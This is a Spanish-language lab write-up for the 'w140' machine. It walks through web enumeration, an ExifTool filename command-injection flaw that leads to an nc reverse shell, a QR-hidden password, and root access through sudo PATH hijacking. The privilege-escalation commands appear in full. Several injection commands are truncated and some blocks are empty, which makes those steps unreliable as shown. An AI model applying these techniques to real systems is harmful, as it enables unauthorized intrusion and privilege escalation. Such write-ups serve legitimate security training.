# 🖥️ Máquina: w140

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Avanzadas  
> **Técnicas trabajadas:** Enumeración web · ExifTool Command Injection · Reverse Shell · Esteganografía (código QR) · Escalada de privilegios (sudo + PATH Hijacking)  
> **Descripción:** En esta práctica descubriremos un formulario de subida de imágenes que procesa los archivos con ExifTool, explotaremos una vulnerabilidad de command injection en el nombre del archivo (CVE relacionado con ExifTool < 12.38), obtendremos una reverse shell, descubriremos credenciales ocultas en un código QR y escalaremos privilegios mediante PATH Hijacking sobre un script ejecutado con sudo.  
>

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.44`
* **`RHOST` (Víctima / w140):** Ej. `10.0.0.50`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina w140 tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

## 🌐 Fase 2: Enumeración web

Comprobamos las tecnologías que usa la web con whatweb:

```bash
whatweb http://$rhost
```

```text
http://10.0.0.50 [200 OK] Apache[2.4.54], HTML5, JQuery[3.3.1], PasswordField[confirm-password,user-password], Title[w140]
```

> [!info] Resultado
> La web tiene campos de contraseña, lo que indica algún tipo de formulario de registro o login. Usamos nikto para buscar vulnerabilidades y configuraciones incorrectas:

```bash
nikto -h http://$rhost
```

```text
+ Server: Apache/2.4.54 (Debian)
+ /css/: Directory indexing found.
+ /manual/: Web server manual found.
+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
```

> [!info] Resultado
> Nikto no encuentra vulnerabilidades críticas pero sí algunos directorios accesibles. Usamos gobuster para descubrir más recursos:

```bash
gobuster dir -u "http://$rhost" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```text
/index.html   (Status: 200) [Size: 13235]
/assets       (Status: 301) [--> http://10.0.0.50/assets/]
/upload.php   (Status: 200) [Size: 3773]
/service.html (Status: 200) [Size: 3417]
/css          (Status: 301) [--> http://10.0.0.50/css/]
/manual       (Status: 301) [--> http://10.0.0.50/manual/]
/js           (Status: 301) [--> http://10.0.0.50/js/]
```

> [!info] Resultado
> Encontramos upload.php y service.html. Al visitar http://10.0.0.50/service.html encontramos un formulario que permite subir imágenes y devuelve un informe con su información EXIF. Descargamos una imagen de prueba:

```bash
wget https://cursosmfr.es/original.jpg
```

Subimos la imagen y observamos el informe que nos devuelve el servidor:

```text
ExifTool Version Number         : 12.37
File Name                       : original.jpg
File Size                       : 31 KiB
File Type                       : JPEG
MIME Type                       : image/jpeg
Image Width                     : 360
Image Height                    : 360
Megapixels                      : 0.130
```

> [!info] Resultado
> El dato más importante es la versión de ExifTool: 12.37. ExifTool en versiones anteriores a 12.38 tiene una vulnerabilidad de command injection que se activa a través del nombre del archivo que se procesa. Cuando ExifTool analiza un archivo cuyo nombre sigue la estructura comando |, interpreta parte del nombre como un comando de shell y lo ejecuta. Esto nos permite ejecutar comandos arbitrarios en el servidor simplemente subiendo un archivo con el nombre adecuado.

## 💉 Fase 3: ExifTool Command Injection — verificación

Antes de lanzar una reverse shell verificamos que la vulnerabilidad funciona. Creamos un archivo cuyo nombre contiene el comando que queremos ejecutar. La estructura es: comando | nc LHOST puerto |. El servidor ejecutará el comando y enviará el resultado a nuestro netcat:

```bash
nc -lvnp 9002
```

```bash
cp original.jpg
```

> [!info] Resultado
> Subimos el archivo y si todo va bien recibimos en Kali la palabra hola. Confirmado el funcionamiento, hacemos otra prueba con ping para verificarlo de otra forma:

Creamos el archivo con ping y en Kali capturamos los paquetes ICMP:

```bash
cp original.jpg
```

```bash
sudo tcpdump -i eth0 icmp
```

```text
listening on eth0, link-type EN10MB (Ethernet)
13:56:42.651518 IP 10.0.0.50 > 10.0.0.44: ICMP echo request, id 45925, seq 1, length 64
13:56:42.651545 IP 10.0.0.44 > 10.0.0.50: ICMP echo reply, id 45925, seq 1, length 64
```

> [!info] Resultado
> Los paquetes llegan desde la víctima. La vulnerabilidad está confirmada. Paramos tcpdump con CTRL+C y volvemos a poner netcat en escucha.

Probamos ahora ejecutando comandos con variables. La estructura miCMD=$(comando) captura la salida del comando en una variable y luego la enviamos por netcat:

```bash
nc -lvnp 9002
```

```bash
cp original.jpg
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!info] Resultado
> Ejecución de comandos confirmada como www-data. El problema con comandos más complejos es que las rutas con barras como /etc/passwd no pueden ir directamente en el nombre del archivo porque el sistema las interpreta como separadores de directorios. La solución es codificar el comando en base64.

## 🔁 Fase 4: Explotación con base64 y reverse shell

La técnica consiste en codificar en base64 el comando completo y guardarlo en una variable de Kali. Ese valor se usa como nombre del archivo. Cuando ExifTool lo procesa, decodifica el base64 y lo ejecuta con bash. Así evitamos cualquier problema con barras, espacios o caracteres especiales.

> [!warning] Advertencia
> ⚠️ Es conveniente parar el nc con CTRL+C y volver a lanzarlo entre cada prueba para asegurarse de que está escuchando correctamente.

Probamos primero con id:

```bash
comando=$(echo
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Leemos /etc/passwd:

```bash
comando=$(echo
```

> [!info] Resultado
> Recibimos el contenido completo de /etc/passwd. Comprobamos si nc está disponible en la víctima para usarlo en la reverse shell:

```bash
comando=$(echo
```

```text
/usr/bin/nc
```

> [!info] Resultado
> nc está disponible. Antes de lanzar la reverse shell borramos todos los archivos de prueba que hemos creado:

```bash
rm echo*
```

Ponemos Kali en escucha y lanzamos la reverse shell:

```bash
nc -lvnp 9002
```

```bash
comando=$(echo
```

```text
listening on [any] 9002 ...
connect to [10.0.0.44] from (UNKNOWN) [10.0.0.50] 50594
bash: cannot set terminal process group (440): Inappropriate ioctl for device
bash: no job control in this shell
www-data@w140:/var/www/uploads/1772976770$
```

> [!info] Resultado
> Conexión recibida como www-data. Tenemos una shell en el servidor.

```bash

```

```text

```

> [!info] Resultado
> Hay un usuario llamado ghost. Necesitamos encontrar sus credenciales. Investigamos el directorio /var/www en busca de archivos ocultos:

```bash
cd /var/www
```

```bash
ls -la
```

```text
-rw-r--r--  1 root  root  28744 Feb 21  2023 .w140.png
```

> [!info] Resultado
> Hay un archivo PNG oculto (su nombre empieza por punto). Los archivos ocultos en directorios web suelen contener información relevante. Lo copiamos a un directorio accesible desde el navegador:

```bash
cp .w140.png html/assets/w140.png
```

> [!info] Resultado
> Accedemos desde el navegador a http://10.0.0.50/assets/w140.png y vemos que es un código QR. Lo decodificamos en:
> https://products.aspose.app/barcode/es/recognize/qr#/
> El código QR contiene: BaoeCblP5KGJDmA

## 🚀 Fase 7: Escalada de privilegios — sudo + PATH Hijacking

```bash
sudo -l
```

```text
User ghost may run the following commands on w140:
    (root) SETENV: NOPASSWD: /opt/Benz-w140
```

> [!info] Resultado
> ghost puede ejecutar /opt/Benz-w140 como root sin contraseña. La opción SETENV es clave: permite al usuario establecer variables de entorno al ejecutar el comando con sudo, lo que incluye modificar el PATH. Leemos el script para entender qué hace:

```bash
cat /opt/Benz-w140
```

```text
#!/bin/bash
. /opt/.bashre
cd /home/ghost/w140

# clean up log files
if [ -s log/w140.log ] && ! [ -L log/w140.log ]
then
/bin/cat log/w140.log > log/w140.log.old
/usr/bin/truncate -s@ log/w140.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

> [!info] Resultado
> La línea crítica es la última: el script llama a find con una ruta relativa, sin especificar su ruta completa como /usr/bin/find. Esto lo hace vulnerable a PATH Hijacking: si creamos un archivo llamado find en un directorio que esté antes que /usr/bin en el PATH, cuando root ejecute el script encontrará primero el nuestro.
> Gracias a la opción SETENV en el sudo, podemos modificar el PATH al lanzar el script y poner /tmp al principio. Creamos nuestro find malicioso en /tmp:

```bash
cd /tmp
```

```bash
echo "/usr/bin/bash" > find
```

```bash
chmod +x find
```

```bash
cat find
```

```text
/usr/bin/bash
```

Ejecutamos el script con sudo anteponiendo /tmp al PATH:

```bash
sudo PATH=/tmp:$PATH /opt/Benz-w140
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> [!info] Resultado
> Cuando el script llega a la línea find source_images..., busca el comando find recorriendo el PATH en orden. Encuentra primero /tmp/find, nuestro archivo que lanza una bash, y lo ejecuta con privilegios de root.

```bash
cd /root
```

```bash
cat root.txt
```

```text
2f9f7d1b4a6ae9d6bbbaf6298c5dcc25
```

> [!info] Resultado
> Flag de root obtenida: 2f9f7d1b4a6ae9d6bbbaf6298c5dcc25
